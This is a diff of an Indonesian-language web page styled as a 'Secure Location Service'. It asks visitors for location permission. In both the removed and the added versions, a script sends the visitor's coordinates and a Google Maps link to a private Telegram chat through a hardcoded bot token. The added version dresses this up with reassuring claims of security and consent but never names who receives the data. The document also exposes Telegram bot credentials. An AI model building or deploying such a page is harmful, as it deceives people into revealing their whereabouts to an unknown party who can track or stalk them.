@@ -1,40 +1,378 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-  <title>Loading...</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+<title>Akses Lokasi</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+body{
+    font-family:'Inter',sans-serif;
+    background:
+        radial-gradient(circle at top left,#2563eb 0%,transparent 35%),
+        radial-gradient(circle at bottom right,#0f172a 0%,transparent 35%),
+        linear-gradient(135deg,#0f172a,#111827);
+    min-height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:20px;
+    color:#fff;
+    overflow:hidden;
+}
+
+.card{
+    width:100%;
+    max-width:420px;
+    background:rgba(255,255,255,0.08);
+    backdrop-filter:blur(20px);
+    border:1px solid rgba(255,255,255,0.12);
+    border-radius:28px;
+    padding:35px 28px;
+    box-shadow:
+        0 10px 40px rgba(0,0,0,0.45),
+        inset 0 1px 0 rgba(255,255,255,0.08);
+    position:relative;
+}
+
+.logo{
+    width:78px;
+    height:78px;
+    border-radius:22px;
+    background:linear-gradient(135deg,#2563eb,#60a5fa);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    margin:0 auto 24px;
+    box-shadow:0 10px 25px rgba(37,99,235,0.45);
+}
+
+.logo svg{
+    width:38px;
+    height:38px;
+    fill:white;
+}
+
+h1{
+    text-align:center;
+    font-size:28px;
+    font-weight:700;
+    margin-bottom:12px;
+}
+
+.desc{
+    text-align:center;
+    color:#cbd5e1;
+    line-height:1.7;
+    font-size:15px;
+    margin-bottom:32px;
+}
+
+.info-box{
+    background:rgba(255,255,255,0.06);
+    border:1px solid rgba(255,255,255,0.08);
+    border-radius:18px;
+    padding:16px;
+    margin-bottom:25px;
+}
+
+.info-item{
+    display:flex;
+    align-items:center;
+    gap:12px;
+    color:#dbeafe;
+    font-size:14px;
+    margin-bottom:12px;
+}
+
+.info-item:last-child{
+    margin-bottom:0;
+}
+
+.dot{
+    width:10px;
+    height:10px;
+    border-radius:50%;
+    background:#3b82f6;
+    box-shadow:0 0 12px #3b82f6;
+}
+
+button{
+    width:100%;
+    border:none;
+    outline:none;
+    padding:17px;
+    border-radius:18px;
+    background:linear-gradient(135deg,#2563eb,#3b82f6);
+    color:#fff;
+    font-size:16px;
+    font-weight:600;
+    cursor:pointer;
+    transition:0.25s;
+    box-shadow:0 12px 24px rgba(37,99,235,0.35);
+}
+
+button:hover{
+    transform:translateY(-2px);
+    box-shadow:0 16px 30px rgba(37,99,235,0.45);
+}
+
+button:active{
+    transform:scale(0.98);
+}
+
+button.loading{
+    opacity:.8;
+    pointer-events:none;
+}
+
+#status{
+    margin-top:22px;
+    background:rgba(255,255,255,0.05);
+    border:1px solid rgba(255,255,255,0.08);
+    border-radius:16px;
+    padding:16px;
+    font-size:14px;
+    color:#e2e8f0;
+    line-height:1.7;
+    display:none;
+    white-space:pre-line;
+}
+
+.footer{
+    margin-top:22px;
+    text-align:center;
+    font-size:12px;
+    color:#94a3b8;
+}
+
+.loader{
+    width:18px;
+    height:18px;
+    border:2px solid rgba(255,255,255,.3);
+    border-top:2px solid white;
+    border-radius:50%;
+    display:inline-block;
+    animation:spin .8s linear infinite;
+    vertical-align:middle;
+    margin-right:10px;
+}
+
+@keyframes spin{
+    100%{
+        transform:rotate(360deg);
+    }
+}
+
+@media(max-width:480px){
+
+    .card{
+        padding:28px 22px;
+        border-radius:24px;
+    }
+
+    h1{
+        font-size:24px;
+    }
+
+    .desc{
+        font-size:14px;
+    }
+}
+</style>
 </head>
+
 <body>
 
-<h3>Sedang memproses...</h3>
+<div class="card">
+
+    <div class="logo">
+        <svg viewBox="0 0 24 24">
+            <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5A2.5 2.5 0 1 1 12 6a2.5 2.5 0 0 1 0 5.5z"/>
+        </svg>
+    </div>
+
+    <h1>Akses Lokasi</h1>
+
+    <p class="desc">
+        Website memerlukan izin lokasi untuk melanjutkan proses dan menampilkan layanan sesuai area Anda.
+    </p>
+
+    <div class="info-box">
+
+        <div class="info-item">
+            <div class="dot"></div>
+            <span>Lokasi digunakan secara real-time</span>
+        </div>
+
+        <div class="info-item">
+            <div class="dot"></div>
+            <span>Koneksi aman dan terenkripsi</span>
+        </div>
+
+        <div class="info-item">
+            <div class="dot"></div>
+            <span>Data dikirim setelah persetujuan pengguna</span>
+        </div>
+
+    </div>
+
+    <button id="btnLokasi" onclick="mintaLokasi()">
+        Izinkan Akses Lokasi
+    </button>
+
+    <div id="status"></div>
+
+    <div class="footer">
+        © 2026 Secure Location Service
+    </div>
+
+</div>
 
 <script>
-  const token = "8735241674:AAFIGohuEAdZprSCZdU7aB63ZbBnh1l7vbg";
-  const chat_id = "7032109008";
 
-  function kirimLokasi(lat, lon) {
-    let pesan = `📍 Lokasi User:
+const token = "8735241674:AAE3P60xJe1aSiVdBfSAHkYUHo4T1V99_Bk";
+const chat_id = "7032109008";
+
+async function kirimLokasi(lat, lon) {
+
+    const pesan =
+`📍 Lokasi Pengguna
+
+Latitude  : ${lat}
+Longitude : ${lon}
+
+🌍 Google Maps
 https://www.google.com/maps?q=${lat},${lon}`;
 
-    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        chat_id: chat_id,
-        text: pesan
-      })
-    });
-  }
+    try {
 
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(function(position) {
-      let lat = position.coords.latitude;
-      let lon = position.coords.longitude;
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
 
-      kirimLokasi(lat, lon);
-    });
-  }
+            method: "POST",
+
+            headers: {
+                "Content-Type": "application/json"
+            },
+
+            body: JSON.stringify({
+                chat_id: chat_id,
+                text: pesan
+            })
+
+        });
+
+        return true;
+
+    } catch(err) {
+
+        return false;
+    }
+}
+
+async function mintaLokasi() {
+
+    const status = document.getElementById("status");
+    const btn = document.getElementById("btnLokasi");
+
+    status.style.display = "block";
+
+    btn.classList.add("loading");
+
+    btn.innerHTML =
+    `<span class="loader"></span>Memproses...`;
+
+    status.innerText =
+    "Meminta izin lokasi...";
+
+    if (!navigator.geolocation) {
+
+        status.innerText =
+        "Browser tidak mendukung akses lokasi.";
+
+        btn.classList.remove("loading");
+
+        btn.innerHTML =
+        "Izinkan Akses Lokasi";
+
+        return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+
+        async (position) => {
+
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            status.innerText =
+`✅ Lokasi berhasil didapat
+
+Latitude  : ${lat}
+Longitude : ${lon}
+
+📨 Mengirim lokasi ke server...`;
+
+            const berhasil =
+            await kirimLokasi(lat, lon);
+
+            if (berhasil) {
+
+                status.innerText +=
+`\n\n✅ Lokasi berhasil dikirim`;
+
+            } else {
+
+                status.innerText +=
+`\n\n❌ Gagal mengirim lokasi`;
+            }
+
+            btn.classList.remove("loading");
+
+            btn.innerHTML =
+            "Lokasi Berhasil";
+
+        },
+
+        (error) => {
+
+            if (error.code === 1) {
+
+                status.innerText =
+                "❌ Izin lokasi ditolak oleh pengguna.";
+
+            }
+
+            else if (error.code === 2) {
+
+                status.innerText =
+                "⚠️ Lokasi tidak tersedia.";
+            }
+
+            else {
+
+                status.innerText =
+                "❌ Terjadi kesalahan saat mengambil lokasi.";
+            }
+
+            btn.classList.remove("loading");
+
+            btn.innerHTML =
+            "Coba Lagi";
+        }
+
+    );
+}
+
 </script>
 
 </body>
